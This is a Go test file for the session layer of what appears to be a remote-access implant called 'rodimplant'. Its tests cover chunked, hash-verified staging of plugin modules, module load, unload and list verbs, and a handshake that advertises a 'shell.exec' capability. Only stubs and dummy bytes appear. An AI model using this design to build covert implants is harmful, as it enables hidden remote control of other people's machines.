package session

import (
	"crypto/sha256"
	"encoding/hex"
	"testing"

	"rodimplant/internal/plugins"
	"rodimplant/internal/wire"
)

// stubModules is the session tests' registry: the load dispatches are
// recorded, the answers configured -- the seam that pins the staged arm
// and the advertisement widening without a platform loader.
type stubModules struct {
	loads      []string
	loadReport string
	loadErr    error
	unloads    []string
	listAnswer string
	routed     map[string]string
	verbs      []string
}

func (m *stubModules) Load(handle string, payload []byte, expectedSHA256 string) (string, error) {
	m.loads = append(m.loads, handle)
	if m.loadErr != nil {
		return "", m.loadErr
	}
	return m.loadReport, nil
}

func (m *stubModules) Unload(name string) (string, error) {
	m.unloads = append(m.unloads, name)
	return "unloaded " + name, nil
}

func (m *stubModules) List() string {
	if m.listAnswer != "" {
		return m.listAnswer
	}
	return "no modules loaded"
}

func (m *stubModules) Dispatch(verb, arguments string) (wire.TaskOutcome, string, *plugins.Artifact, bool) {
	if output, ok := m.routed[verb]; ok {
		return wire.TaskOutcome_TASK_OUTCOME_SUCCEEDED, output, nil, true
	}
	return 0, "", nil, false
}

func (m *stubModules) AdvertisedVerbs() []string { return m.verbs }

func sessionWithModules(modules *stubModules) *Session {
	s := newSession()
	s.plugins = modules
	return s
}

func hexSHA(bytes []byte) string {
	sum := sha256.Sum256(bytes)
	return hex.EncodeToString(sum[:])
}

func stagedTask(taskID, arguments string, size uint64) *wire.TaskRequest {
	return &wire.TaskRequest{TaskId: taskID, Verb: "module.load", Arguments: arguments, StagedBytes: &size}
}

func chunk(taskID string, sequence uint64, offset uint64, terminal bool, data []byte) *wire.StagedChunk {
	return &wire.StagedChunk{
		TaskId: taskID, Sequence: sequence, Terminal: terminal,
		Data: data, Offset: &offset,
	}
}

func legacyChunk(taskID string, sequence uint64, terminal bool, data []byte) *wire.StagedChunk {
	return &wire.StagedChunk{TaskId: taskID, Sequence: sequence, Terminal: terminal, Data: data}
}

func stagedResult(t *testing.T, s *Session, index int) *wire.TaskResult {
	t.Helper()
	frames := s.Batch()
	if len(frames) <= index {
		t.Fatalf("expected result frame %d, got %d frames", index, len(frames))
	}
	var result wire.TaskResult
	mustUnframe(t, frames[index], &result)
	return &result
}

func TestStagedTaskRegistersInsteadOfExecuting(t *testing.T) {
	modules := &stubModules{}
	s := sessionWithModules(modules)
	s.Dispatch(stagedTask("st-1", "conform sha256:"+hexSHA([]byte("bytes")), 5))

	if len(s.Batch()) != 0 {
		t.Fatal("a staged task reports nothing until its payload arrives")
	}
	if len(modules.loads) != 0 {
		t.Fatal("nothing loads before the terminal chunk")
	}
	demands := s.StagedDemands()
	if len(demands) != 1 {
		t.Fatalf("the pending transfer demands, got %d frames", len(demands))
	}
	var pull wire.StagedPull
	mustUnframe(t, demands[0], &pull)
	if pull.TaskId != "st-1" || pull.Offset != nil || pull.PrefixSha256 != nil {
		t.Fatalf("a fresh transfer sends the plain shape, got task=%q offset=%v prefix=%v",
			pull.TaskId, pull.Offset, pull.PrefixSha256)
	}
}

func TestStagedTransferCompletesAndReportsThePayloadHash(t *testing.T) {
	modules := &stubModules{loadReport: "module conform loaded: conform.plugin; advertised at the next contact"}
	s := sessionWithModules(modules)
	payload := make([]byte, 2048)
	for i := range payload {
		payload[i] = byte(i)
	}
	s.Dispatch(stagedTask("st-1", "conform sha256:"+hexSHA(payload), uint64(len(payload))))

	s.acceptStagedChunk(chunk("st-1", 0, 0, false, payload[:1000]))
	if got := len(s.Batch()); got != 0 {
		t.Fatalf("a non-terminal chunk reports nothing, got %d frames", got)
	}
	// The resumed demand proves the held prefix by hash.
	var pull wire.StagedPull
	mustUnframe(t, s.StagedDemands()[0], &pull)
	if pull.Offset == nil || *pull.Offset != 1000 || len(pull.PrefixSha256) != 32 {
		t.Fatalf("a resumed demand names the seam and proves the prefix, got offset=%v prefix=%d bytes",
			pull.Offset, len(pull.PrefixSha256))
	}
	if hexSHA(payload[:1000]) != hex.EncodeToString(pull.PrefixSha256) {
		t.Fatal("the prefix proof is the SHA-256 of exactly the held bytes")
	}

	s.acceptStagedChunk(chunk("st-1", 1, 1000, true, payload[1000:]))
	if len(modules.loads) != 1 || modules.loads[0] != "conform" {
		t.Fatalf("the terminal chunk loads the module, got %v", modules.loads)
	}
	result := stagedResult(t, s, 0)
	if result.Outcome != wire.TaskOutcome_TASK_OUTCOME_SUCCEEDED {
		t.Fatalf("the load succeeded, got %v", result.Outcome)
	}
	if result.PayloadSha256 == nil || *result.PayloadSha256 != hexSHA(payload) {
		t.Fatalf("the result carries the reassembled payload's hash, got %v", result.PayloadSha256)
	}
	if len(s.StagedDemands()) != 0 {
		t.Fatal("the completed transfer stops demanding")
	}

	// A redelivered staged task answers from the cache, nothing re-loads.
	s.Dispatch(stagedTask("st-1", "conform sha256:"+hexSHA(payload), uint64(len(payload))))
	if len(modules.loads) != 1 || len(s.Batch()) != 2 {
		t.Fatal("a completed staged task re-answers from the result cache")
	}
}

func TestStagedRestartOnOffsetZeroResetsTheTransfer(t *testing.T) {
	modules := &stubModules{loadReport: "loaded"}
	s := sessionWithModules(modules)
	payload := []byte("the restarted payload")
	s.Dispatch(stagedTask("st-1", "conform sha256:"+hexSHA(payload), uint64(len(payload))))
	s.acceptStagedChunk(chunk("st-1", 0, 0, false, []byte("bytes the restart discards")))
	s.acceptStagedChunk(chunk("st-1", 0, 0, true, payload))
	result := stagedResult(t, s, 0)
	if result.Outcome != wire.TaskOutcome_TASK_OUTCOME_SUCCEEDED || result.PayloadSha256 == nil ||
		*result.PayloadSha256 != hexSHA(payload) {
		t.Fatalf("a restart at offset 0 discards the hold, got %v", result)
	}
}

func TestStagedSequenceZeroOnALegacyServerResets(t *testing.T) {
	modules := &stubModules{loadReport: "loaded"}
	s := sessionWithModules(modules)
	payload := []byte("whole again")
	s.Dispatch(stagedTask("st-1", "conform sha256:"+hexSHA(payload), uint64(len(payload))))
	s.acceptStagedChunk(legacyChunk("st-1", 0, false, []byte("a partial from earlier")))
	s.acceptStagedChunk(legacyChunk("st-1", 0, true, payload))
	if result := stagedResult(t, s, 0); result.Outcome != wire.TaskOutcome_TASK_OUTCOME_SUCCEEDED {
		t.Fatalf("sequence 0 over a hold restarts the legacy shape, got %v", result)
	}
}

func TestStagedGapKeepsTheHoldAndTheIdleGuardFailsTheTask(t *testing.T) {
	modules := &stubModules{loadReport: "loaded"}
	s := sessionWithModules(modules)
	payload := make([]byte, 128)
	s.Dispatch(stagedTask("st-1", "conform sha256:"+hexSHA(payload), uint64(len(payload))))
	s.acceptStagedChunk(chunk("st-1", 9, 9000, false, []byte{1, 2, 3}))
	if len(s.StagedDemands()) != 1 {
		t.Fatal("a gap keeps the transfer pending")
	}
	for cycle := 0; cycle < stagedIdleCycles; cycle++ {
		s.StagedCycleEnd()
	}
	result := stagedResult(t, s, 0)
	if result.Outcome != wire.TaskOutcome_TASK_OUTCOME_FAILED ||
		result.Output != "staged payload stream ended without a terminal chunk" {
		t.Fatalf("an unserved demand fails past the idle bound, got %v %q", result.Outcome, result.Output)
	}
	if len(s.StagedDemands()) != 0 {
		t.Fatal("the failed transfer stops demanding")
	}
}

func TestStagedDuplicateTerminalChunkResolvesIdempotently(t *testing.T) {
	modules := &stubModules{loadReport: "loaded"}
	s := sessionWithModules(modules)
	payload := []byte("idempotent")
	sum := hexSHA(payload)
	s.Dispatch(stagedTask("st-1", "conform sha256:"+sum, uint64(len(payload))))
	s.acceptStagedChunk(chunk("st-1", 0, 0, true, payload))
	s.acceptStagedChunk(chunk("st-1", 0, 0, true, payload))
	if len(modules.loads) != 1 || len(s.Batch()) != 1 {
		t.Fatal("a duplicate terminal chunk resolves once")
	}
}

func TestStagedHashMismatchFails(t *testing.T) {
	modules := &stubModules{}
	s := sessionWithModules(modules)
	s.Dispatch(stagedTask("st-1", "conform sha256:"+hexSHA([]byte("other bytes")), 11))
	s.acceptStagedChunk(chunk("st-1", 0, 0, true, []byte("the payload")))
	result := stagedResult(t, s, 0)
	if result.Outcome != wire.TaskOutcome_TASK_OUTCOME_FAILED {
		t.Fatal("a mismatched hash fails the task")
	}
	if result.PayloadSha256 == nil || *result.PayloadSha256 != hexSHA([]byte("the payload")) {
		t.Fatal("the mismatch failure names what actually arrived")
	}
	want := "module.load staged: payload hash mismatch: expected " + hexSHA([]byte("other bytes")) +
		", received " + hexSHA([]byte("the payload"))
	if result.Output != want {
		t.Fatalf("the mismatch names both hashes:\n got %q\nwant %q", result.Output, want)
	}
	if len(modules.loads) != 0 {
		t.Fatal("nothing loads on a mismatch")
	}
}

func TestStagedGrammarRefusals(t *testing.T) {
	s := sessionWithModules(&stubModules{})
	s.Dispatch(stagedTask("st-1", "no-token-here", 3))
	s.acceptStagedChunk(chunk("st-1", 0, 0, true, []byte("abc")))
	if result := stagedResult(t, s, 0); result.Output != "module.load staged expects '<...> sha256:<hex>'" {
		t.Fatalf("a missing hash token fails on the grammar, got %q", result.Output)
	}

	s = sessionWithModules(&stubModules{})
	s.Dispatch(stagedTask("st-2", " sha256:"+hexSHA([]byte("abc")), 3))
	s.acceptStagedChunk(chunk("st-2", 0, 0, true, []byte("abc")))
	if result := stagedResult(t, s, 0); result.Output != "module.load staged expects '<name> sha256:<hex>'" {
		t.Fatalf("an empty module name fails on the grammar, got %q", result.Output)
	}

	s = sessionWithModules(&stubModules{})
	s.Dispatch(&wire.TaskRequest{TaskId: "st-3", Verb: "file.push",
		Arguments: "dest sha256:" + hexSHA([]byte("abc")), StagedBytes: u64(3)})
	s.acceptStagedChunk(chunk("st-3", 0, 0, true, []byte("abc")))
	if result := stagedResult(t, s, 0); result.Output != "file.push: this build carries no staged handler for the verb" {
		t.Fatalf("a verb with no staged handler fails naming it, got %q", result.Output)
	}
}

func TestModuleFamilyDispatch(t *testing.T) {
	modules := &stubModules{listAnswer: "conform: conform.plugin"}
	s := sessionWithModules(modules)

	s.Dispatch(&wire.TaskRequest{TaskId: "m-1", Verb: "module.load", Arguments: "conform"})
	if result := stagedResult(t, s, 0); result.Outcome != wire.TaskOutcome_TASK_OUTCOME_FAILED ||
		result.Output != "module.load stages its bytes as task content; issue it with the module as content" {
		t.Fatalf("an inline module.load refuses with the staged grammar, got %q", result.Output)
	}
	s.Dispatch(&wire.TaskRequest{TaskId: "m-2", Verb: "module.unload", Arguments: "conform"})
	if result := stagedResult(t, s, 1); result.Outcome != wire.TaskOutcome_TASK_OUTCOME_SUCCEEDED ||
		result.Output != "unloaded conform" {
		t.Fatalf("module.unload retracts, got %q", result.Output)
	}
	s.Dispatch(&wire.TaskRequest{TaskId: "m-3", Verb: "module.unload", Arguments: "  "})
	if result := stagedResult(t, s, 2); result.Output != "module.unload expects '<name>'" {
		t.Fatalf("an empty unload fails on the grammar, got %q", result.Output)
	}
	s.Dispatch(&wire.TaskRequest{TaskId: "m-4", Verb: "module.list"})
	if result := stagedResult(t, s, 3); result.Output != "conform: conform.plugin" {
		t.Fatalf("module.list answers the registry's lines, got %q", result.Output)
	}
}

func TestModuleVerbsRouteThroughTheRegistry(t *testing.T) {
	modules := &stubModules{routed: map[string]string{"conform.plugin": "conform:marker"}}
	s := sessionWithModules(modules)
	s.Dispatch(&wire.TaskRequest{TaskId: "r-1", Verb: "conform.plugin", Arguments: "marker"})
	result := stagedResult(t, s, 0)
	if result.Outcome != wire.TaskOutcome_TASK_OUTCOME_SUCCEEDED || result.Output != "conform:marker" {
		t.Fatalf("a loaded module's verb dispatches through the registry, got %q", result.Output)
	}
	s.Dispatch(&wire.TaskRequest{TaskId: "r-2", Verb: "fs.list"})
	if result := stagedResult(t, s, 1); result.Outcome != wire.TaskOutcome_TASK_OUTCOME_FAILED ||
		result.Output != "unknown verb fs.list" {
		t.Fatalf("an unrouted verb stays unknown, got %q", result.Output)
	}
}

func TestHandshakeWidensWithLoaderRowsAndModuleVerbs(t *testing.T) {
	modules := &stubModules{verbs: []string{"conform.plugin"}}
	s := sessionWithModules(modules)
	var request wire.HandshakeRequest
	mustUnframe(t, s.HandshakeFrame(), &request)

	want := append([]string{"shell.exec"}, plugins.LoaderCapabilities()...)
	want = append(want, "conform.plugin")
	if len(request.Capabilities) != len(want) {
		t.Fatalf("capabilities = advertised + loader rows + module verbs, got %v", request.Capabilities)
	}
	for i, row := range want {
		if request.Capabilities[i] != row {
			t.Fatalf("capability %d = %q, want %q (full: %v)", i, request.Capabilities[i], row, request.Capabilities)
		}
	}
}

func TestKindlessFramesSplitByVerbPresence(t *testing.T) {
	modules := &stubModules{loadReport: "loaded"}
	s := sessionWithModules(modules)
	payload := []byte("via the body")
	s.Dispatch(stagedTask("st-1", "conform sha256:"+hexSHA(payload), uint64(len(payload))))

	// The chunk rides a kindless frame; its parse as tasking has no verb,
	// so it routes to the staged arm, and the task frame beside it still
	// dispatches.
	frames := []*wire.Frame{
		FrameOf(chunk("st-1", 0, 0, true, payload), wire.FrameKind_FRAME_KIND_UNSPECIFIED),
		FrameOf(&wire.TaskRequest{TaskId: "t-1", Verb: "shell.exec"}, wire.FrameKind_FRAME_KIND_UNSPECIFIED),
	}
	s.AcceptTasking(frames)
	if len(modules.loads) != 1 {
		t.Fatal("the chunk frame placed and the staged task completed")
	}
	if result := stagedResult(t, s, 0); result.PayloadSha256 == nil {
		t.Fatal("the staged completion carries the payload hash")
	}
	if result := stagedResult(t, s, 1); result.TaskId != "t-1" || result.Output != "ran" {
		t.Fatalf("the task frame beside it dispatched, got %+v", result)
	}
}
